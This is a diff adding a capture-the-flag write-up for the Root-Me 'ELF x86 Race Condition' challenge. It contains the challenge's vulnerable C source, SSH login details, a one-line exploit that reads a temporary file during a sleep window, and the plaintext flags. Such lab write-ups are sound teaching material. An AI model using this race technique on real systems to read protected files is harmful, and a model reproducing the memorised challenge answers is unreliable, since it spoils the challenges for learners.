@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me App - System Challenges [6/83]
+# [Root-Me](./rootme.md) Root-Me App - System Challenges [7/83]
 
 These challenges will help you understand applicative vulnerabilities. 
 
@@ -10,7 +10,7 @@ These challenges will help you understand applicative vulnerabilities.
 4. [ELF x86 - Format string bug basic 1](#elf-x86-format-string-bug-basic-1) 🗸
 5. [ELF x64 - Stack buffer overflow - basic](#elf-x64-stack-buffer-overflow-basic) 🗸
 6. [ELF x86 - Format string bug basic 2](#elf-x86-format-string-bug-basic-2) 🗸
-7. [ELF x86 - Race condition](#elf-x86-race-condition)
+7. [ELF x86 - Race condition](#elf-x86-race-condition) 🗸
 8. [ELF ARM - Stack buffer overflow - basic](#elf-arm-stack-buffer-overflow-basic)
 9. [ELF MIPS - Stack buffer overflow - No NX](#elf-mips-stack-buffer-overflow-no-nx)
 10. [ELF x64 - Double free](#elf-x64-double-free)
@@ -1062,6 +1062,145 @@ app-systeme-ch14-cracked@challenge02:~$ cat .passwd
 
 ~~~
 1l1k3p0Rn&P0pC0rn
+~~~
+
+</details>
+
+---
+
+### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+    
+## ELF x86 Race Condition
+
+- Author: Lu33Y
+- Date: 8 February 2012
+- Points: 20
+- Level: 2
+
+### Statement
+
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~c
+    #include <stdio.h>
+    #include <string.h>
+    #include <sys/ptrace.h>
+    #include <unistd.h>
+    #include <sys/types.h>
+    #include <sys/stat.h>
+    #include <fcntl.h>
+    #include <stdlib.h>
+     
+    #define PASSWORD "/challenge/app-systeme/ch12/.passwd"
+    #define TMP_FILE "/tmp/tmp_file.txt"
+     
+    int main(void)
+    {
+      int fd_tmp, fd_rd;
+      char ch;
+     
+     
+      if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
+        {
+          printf("[-] Don't use a debugguer !\n");
+          abort();
+        }
+      if((fd_tmp = open(TMP_FILE, O_WRONLY | O_CREAT, 0444)) == -1)
+        {
+          perror("[-] Can't create tmp file ");
+          goto end;
+        }
+       
+      if((fd_rd = open(PASSWORD, O_RDONLY)) == -1)
+        {
+          perror("[-] Can't open file ");
+          goto end;
+        }
+       
+      while(read(fd_rd, &ch, 1) == 1)
+        {
+          write(fd_tmp, &ch, 1);
+        }
+      close(fd_rd);
+      close(fd_tmp);
+      usleep(250000);
+    end:
+      unlink(TMP_FILE);
+       
+      return 0;
+    }
+~~~
+
+</details>
+
+### Connection Details
+
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port:2222
+- SSH access: ssh -p 2222 app-systeme-ch12@challenge02.root-me.org 
+- Username: app-systeme-ch12
+- Password: app-systeme-ch12
+
+### Resources
+
+1. [Secure Coding in C and C++ Race Conditions](https://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf).
+2. [Race Donsition Vulnerability Lab](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/EN%20-%20Race%20Condition%20Vulnerability%20Lab.pdf).
+3. [Exploiting Unix File-System Race Condition via Algorithmic Complexity Attacks](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Unix%20File-System%20Race%20Condition%20via%20Algorithmic%20Complexity%20Attacks.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+This program is an example of a race condition in which multiple processes access and manipulate the same data concurrently.  For this, the program opens and stores the answer in a file created in /tmp/tmp_file.txt:
+
+~~~c
+#define PASSWORD "/challenge/app-systeme/ch12/.passwd"
+#define TMP_FILE "/tmp/tmp_file.txt"
+...
+fd_tmp = open(TMP_FILE, O_WRONLY | O_CREAT, 0444)
+...
+fd_rd = open(PASSWORD, O_RDONLY)
+...
+while(read(fd_rd, &ch, 1) == 1)
+{
+    write(fd_tmp, &ch, 1);
+}
+close(fd_rd);
+close(fd_tmp);
+~~~
+
+This copies the flag to a new file, it then pauses for a short period (usleep) and unlinks the temporary file:
+
+~~~c
+usleep(250000);
+...
+unlink(TMP_FILE);
+~~~
+
+During this 0.25 seconds, we need to access the file.  We can pipe the program to an external bash command to exploit this race condition at the sleep point:
+
+~~~shell
+$ ./ch12 | cat /tmp/tmp_file.txt
+eh-q8dEa8q19f9aF()"2a96q92
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+eh-q8dEa8q19f9aF()"2a96q92
 ~~~
 
 </details>
